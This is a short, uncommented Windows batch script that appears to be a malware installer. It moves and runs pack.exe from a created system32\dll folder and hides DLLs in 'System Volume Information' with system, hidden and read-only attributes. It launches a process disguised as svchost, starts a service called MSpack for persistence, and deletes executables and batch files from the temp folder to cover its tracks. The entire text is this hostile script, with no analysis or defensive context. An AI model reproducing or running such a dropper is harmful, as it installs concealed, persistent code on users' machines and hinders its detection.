@echo off
@move pack.exe  %windir%\system32\dll
@cd %windir%\system32\dll
@pack.exe
@attrib +s +h +r ..\dll
@copy mc.dll "\System Volume Information"
@copy mw.dll "\System Volume Information"
@attrib +s +h +r "\System Volume Information\*.dll"
@attrib +s +h +r *.*
@attrib -s -h -r systempacks.dll
@attrib +h systempacks.dll
@svchost /i
@net start MSpack
@sv start MSpack
@attrib +h *.txt
@del %tmp%\*.exe
@del %tmp%\*.bat
@echo y | del %tmp%